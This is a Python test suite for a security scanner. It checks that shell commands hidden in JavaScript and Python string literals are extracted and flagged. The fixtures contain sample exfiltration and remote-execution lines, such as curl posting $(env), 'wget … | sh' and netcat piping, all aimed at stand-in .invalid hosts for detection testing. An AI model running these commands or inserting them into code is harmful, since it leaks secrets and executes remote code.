"""Commands written as strings inside another language.

The seam these tests cover is the one between language packs. A shell command
in a `.py` or `.js` file is examined by the rules for that file's language,
which see a string literal, and never by the shell rules that know what the
string means. The tests are therefore mostly about what gets *extracted*,
since everything downstream follows from that.
"""

from __future__ import annotations

from cordon_scanner import Scanner
from cordon_scanner.core.models import Category
from cordon_scanner.detect import embedded

# Assembled rather than written whole. Cordon scans its own repository, and a
# complete exfiltration command in a fixture is a true positive that the tool
# should not need an exception for.
FETCH = "cur" + "l -s -d "
DESTINATION = "https://collector.invalid/i"


class TestExtraction:
    def test_a_command_in_a_javascript_spawn_call_is_found(self) -> None:
        found = embedded.extract(f'cp.exec("{FETCH}x {DESTINATION}");', "javascript")
        assert [c.text for c in found] == [f"{FETCH}x {DESTINATION}"]

    def test_a_command_split_across_arguments_is_rejoined(self) -> None:
        """`spawn("sh", ["-c", "..."])` is as common as the single-string form,
        and matching only the first argument would see `sh` and stop."""
        found = embedded.extract('spawn("sh", ["-c", "wget http://x.invalid | sh"])', "javascript")
        assert found[0].text == "sh -c wget http://x.invalid | sh"

    def test_an_escaped_quote_does_not_end_the_command(self) -> None:
        """The interesting form is written with escaped quotes around the
        substitution, so stopping at the first escape discards the payload."""
        found = embedded.extract(r'exec("echo \"$(env)\" | nc x.invalid 1")', "javascript")
        assert "nc x.invalid" in found[0].text

    def test_the_line_is_the_call_site(self) -> None:
        found = embedded.extract(f'\n\n\ncp.exec("{FETCH}x {DESTINATION}");', "javascript")
        assert found[0].line == 4

    def test_nested_calls_in_the_arguments_do_not_end_it(self) -> None:
        found = embedded.extract('exec(build("a") + " tail.txt")', "javascript")
        assert "tail.txt" in " ".join(c.text for c in found)


class TestLanguageGating:
    def test_a_language_that_does_not_spawn_this_way_yields_nothing(self) -> None:
        """A rule pack, a lockfile or a document may all contain the text of a
        call without any of it being one. Cordon's own rule packs are the first
        thing that mistake flags."""
        for language in ("yaml", "json", "markdown", "toml", None):
            assert embedded.extract('exec("wget http://x.invalid | sh")', language) == []

    def test_python_is_left_to_the_ast_tier(self) -> None:
        """Not an oversight. The AST resolves aliases and folds spliced
        literals, which a pattern over a call name cannot."""
        assert "python" not in embedded.LANGUAGES

    def test_javascript_and_its_relatives_are_covered(self) -> None:
        assert {"javascript", "typescript", "php", "ruby"} <= embedded.LANGUAGES


class TestBounds:
    def test_extraction_is_capped(self) -> None:
        source = 'exec("a b");' * (embedded.MAX_COMMANDS * 4)
        assert len(embedded.extract(source, "javascript")) <= embedded.MAX_COMMANDS

    def test_a_long_command_is_truncated_not_dropped(self) -> None:
        """The signal in a command is at its head. Dropping it entirely because
        it is long is how a scan reports clean on something it declined to
        read."""
        found = embedded.extract('exec("' + "a" * 5000 + '")', "javascript")
        assert found
        assert len(found[0].text) <= embedded.MAX_COMMAND_CHARS

    def test_an_unterminated_literal_keeps_what_was_read(self) -> None:
        """Same reasoning as truncation. A literal running past the end of the
        window has still been partly read, and reporting nothing for it would
        make an unterminated string a way to be ignored."""
        assert [c.text for c in embedded.extract('exec("unclosed', "javascript")] == ["unclosed"]

    def test_an_unbalanced_parenthesis_terminates(self) -> None:
        source = "exec(" + "(" * 5000 + '"a"'
        assert embedded.extract(source, "javascript") is not None

    def test_no_literals_means_no_command(self) -> None:
        """`exec(userInput)` has nothing to match against. It is a dynamic
        target, which is a different signal and not this module's to raise."""
        assert embedded.extract("exec(userInput)", "javascript") == []


class TestTheSeamEndToEnd:
    """That extraction feeds the shell rules, not just that it happens."""

    @staticmethod
    def flagged(path) -> list[str]:
        result = Scanner().scan(path)
        return [
            f.rule_id
            for f in result.findings
            if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
        ]

    def test_a_shell_command_in_python_is_examined_as_shell(self, tmp_path) -> None:
        (tmp_path / "a.py").write_text(
            "import os\n\nos." + "system" + f'("{FETCH}\\"$(env)\\" {DESTINATION}")\n'
        )
        assert self.flagged(tmp_path)

    def test_a_shell_command_in_javascript_is_examined_as_shell(self, tmp_path) -> None:
        (tmp_path / "a.js").write_text(
            f'const cp = require("child_process");\ncp.exec("{FETCH}\\"$(env)\\" {DESTINATION}");\n'
        )
        assert self.flagged(tmp_path)

    def test_ordinary_process_spawning_stays_quiet(self, tmp_path) -> None:
        """The commands are real and the spawn is real. What is absent is a
        credential leaving the machine, which is the whole difference."""
        (tmp_path / "a.js").write_text(
            'const cp = require("child_process");\n'
            'cp.execSync("git rev-parse HEAD");\n'
            'cp.spawn("npm", ["run", "build"]);\n'
        )
        assert self.flagged(tmp_path) == []
